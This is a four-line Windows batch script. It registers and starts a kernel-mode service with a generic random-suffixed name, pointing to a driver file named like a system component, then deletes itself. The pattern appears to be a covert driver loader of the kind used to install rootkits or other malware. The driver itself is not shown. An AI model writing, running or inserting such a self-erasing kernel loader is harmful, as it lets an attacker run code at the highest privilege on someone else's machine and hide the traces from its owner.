@echo off
cd %~dp0
sc create ServiceDVRUserBcast_71f2 binpath=C:\Windows\System32\drivers\mlx3_bus.sys type=kernel
sc start ServiceDVRUserBcast_71f2
del "%~f0"



